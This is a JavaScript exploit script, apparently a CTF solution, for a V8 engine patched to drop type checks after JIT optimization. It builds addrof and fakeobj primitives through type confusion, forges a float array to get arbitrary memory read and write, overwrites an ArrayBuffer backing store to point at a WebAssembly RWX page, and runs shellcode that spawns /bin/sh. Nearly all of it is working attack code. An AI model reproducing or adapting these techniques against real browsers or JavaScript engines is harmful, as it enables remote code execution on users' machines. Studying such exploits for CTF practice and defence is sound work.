/* General outline:
 * The v8 patch basically removes type checking for function arguments post-optimization.
 * e.g. let f = (arr) => { return arr[0]; }
 *      If you run f([1]) enough times, the function will be optimized for arrays of PACKED_SMI_ELEMENTS,
 *      and _any_ arrays passed to the function will be treated as PACKED_SMI_ELEMENTS arrays.
 * I create optimised functions for treating generic arrays as PACKED_ELEMENTS && PACKED_DOUBLE_ELEMENTS (i.e. object && float) arrays.
 * These functions are used to create addrof() && fakeobj() primitives.
 * Use a float array as a base to create a fakeobj() float array, as in https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/.
 *    (It is also possible to modify a float array directly using oob indexing, as a result of
 *     pointers taking up less space than floats, but I didn't use oob write techniques.)
 * Use the fake float array for arb r/w primitives, and use the same shellcoding techniques from Horsepower.
 */



/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}
function LO32(val) { // BigInt -> BigInt
    return val & 0xffffffffn;
}
function HI32(val) { // BigInt -> BigInt
    return val >> 32n;
}
function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) { // typeof(val) = BigInt
    return '0x'+val.toString(16);
}


let obj_arr = [{A:1}];
var arr_read_as_float = (arr,ind) => { // (JSArray, SMI/undefined)
    // ind is an optional argument; use 0 if not provided.
    return arr[ind === undefined ? 0 : ind];
};
function arr_read_as_object(arr) {
    return arr[0];
}
for (let i = 0; i < 0x10000; i++) arr_read_as_float([1.1]); // i.e. %OptimizeFunctionOnNextCall
for (let i = 0; i < 0x10000; i++) arr_read_as_object(obj_arr); // same
function addrof(obj) { // object -> BigInt
    let obj_arr = [obj];
    return ftoi(arr_read_as_float(obj_arr));
}
function fakeobj(addr) { // BigInt (compressed pointer) -> Object
    let f_arr = [itof(addr)];
    return arr_read_as_object(f_arr);
}

let float_arr = [1.1,1.2,1.3,1.4,1.5,1.6];
let float_arr_addr = addrof(float_arr);
let obj_arr_map = HI32(float_arr_addr);
float_arr_addr = LO32(float_arr_addr);

console.log('float array address:', hex(float_arr_addr));
console.log('object array map:', hex(obj_arr_map));
/* cheat method: use a constant offset
 *  - map: 0x3f4208243a41 <Map(PACKED_ELEMENTS)> [FastProperties]
 *  - map: 0x3f42082439f1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 i.e. float_arr_map == obj_arr_map-80. I don't like this: Let's try something else.
Each element in a float array is 64 bits, while an object array has 32 bit elements.
We can oob to read float_arr_map.*/
//let big_obj_arr = Array(6).fill(obj_arr[0], 0, 6); <--- can't do this because then the array will be HOLEY :/
let big_obj_arr = [obj_arr[0],obj_arr[0],obj_arr[0],obj_arr[0],obj_arr[0],obj_arr[0]];
let small_float_arr = [1.1];
/*
> for (let i = 0; i < 10; i++) console.log(hex(ftoi(arr_read_as_float(big_obj_arr,i))));
0x8085a2508085a25
0x8085a2508085a25
0x8085a2508085a25
0x208042a99
0x3ff199999999999a
0x804222d082439f1
> %DebugPrint(big_obj_arr);
DebugPrint: 0x257208108d19: [JSArray]
 - map: 0x257208243a41 <Map(PACKED_ELEMENTS)> [FastProperties]
> %DebugPrint(small_float_arr);
DebugPrint: 0x257208108d61: [JSArray]
 - map: 0x2572082439f1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
*/
let float_arr_map = LO32(ftoi(arr_read_as_float(big_obj_arr,5)));
console.assert(float_arr_map == obj_arr_map-80n, 'something went wrong'); // this part can fail if you use gdb; no idea why


// Create a fake float array with elements pointer controlled.
float_arr[0] = itof(float_arr_map);
let float_arr_elems_addr = float_arr_addr+0x18n; // why is this +0x18? Usually the elements lie behind the actual object....?
let fake_float_arr = fakeobj(float_arr_elems_addr+0x8n); // why is this +8??????????
function arb_r(addr) { // BigInt -> BigInt
    float_arr[1] = itof(addr-0x8n + 0x800000000n); // the 0x80* is to fix the length of the array... i think.
    return ftoi(fake_float_arr[0]);
}
function arb_w(addr, val) { // BigInt, BigInt
    float_arr[1] = itof(addr-0x8n + 0x800000000n);
    fake_float_arr[0] = itof(val);
}
console.log('float array map:', hex(float_arr_map));
console.log('float array elements address:', hex(float_arr_elems_addr));


var buf = new ArrayBuffer(0x100);
var uint8_arr = new Uint8Array(buf);
var backing_store_deref = addrof(buf)+12n*8n;

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;
let rwx_deref = LO32(addrof(wasm_instance)+8n*13n);
console.log('to rwx addr:', hex(rwx_deref));
let rwx_addr = arb_r(LO32(rwx_deref));
console.log(hex(rwx_addr));
arb_w(backing_store_deref, rwx_addr);
var shellcode = [0x31, 0xf6, 0x56, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0xf7, 0xee, 0xb0, 0x3b, 0xf, 0x5];
for (let i = 0; i < shellcode.length; i++) uint8_arr[i] = shellcode[i];
console.log('executing shellcode!')
wasm_func();
